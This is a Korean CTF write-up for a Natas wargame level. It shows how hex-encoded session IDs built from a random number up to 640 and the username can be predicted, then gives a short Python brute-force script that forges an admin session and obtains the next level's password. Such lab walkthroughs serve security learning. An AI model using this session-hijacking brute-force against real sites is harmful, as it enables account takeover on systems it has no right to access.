# Category

linux

# Overview

This page uses mostly the same code as the previous level, but session IDs are no longer sequential...

Please login with your admin account to retrieve credentials for natas20.

Username:

Password:

# Analysis

이전 레벨과 같은 소스코드이면서 세션 id를 만들 때 사용된 `$maxid`값이 더 이상 순차적이지 않다고 말하고 있다.

`a`라는 `username`을 입력하고 세션을 확인한 결과 `3538392d61`값이 생성되었다.

다른 문자 `b`를 입력하여 확인했을 때는 `3437322d62`, `c`는 `3337372d63`값으로 `d` 이후의 값이 1씩 순차적으로 늘어난다는 것을 알 수 있다.

`d` 앞부분의 랜덤한 숫자의 규칙성을 찾아보기 위해 100번 정도 요청을 시도한 결과, 2자리씩 묶이며 총 6자리까지 생성될 수 있는 구조로 `[3X3X3X 구조의 2, 4, 6자리]2d[username]`과 같은 구조를 알 수 있다.

`username`에 매칭되는 ASCII코드를 확인해본결과 문자 `a`에 대응되는 hex값이 `61`이다.

hex `2d`는 문자 `-`를 말하고 앞의 숫자는 0-9의 이전코드의 640까지의 랜덤값을 hex로 변환한 상태였다.

소스코드에서는 `[RANDOM 1~640]-[username]`과 같은 값이 hex로 변환되어 세션 id로 사용되는 것을 알 수 있다.

# Exploitation

`username`은 이전 레벨과 같이 `admin`이라는 것을 알고 있으니, 이에 맞는 hex값 `61646d696e`로 고정하고 앞부분은 640까지 반복하면서 hex로 변환하여 세션에 담아 요청한다.

```py
# solve.py
...

def make_sid(i: int):
    """
    session id 구조에 맞게 변경
    """
    prefix = "".join([f"{ord(c):x}" for c in str(i)])

    # 2d: '-'
    # 61646d696e: 'admin'
    return f"{prefix}2d61646d696e"


for i in range(1, 641):
    sid = make_sid(i)
    print(sid)
    res = request(sid)
    if "You are logged in as a regular user." not in res.text:
        print(res.text)
        break


```

세션 id가 일치하여 다음 레벨의 비밀번호가 입력되어있는 응답을 받을 수 있다.

# Flag

`p5...yw`
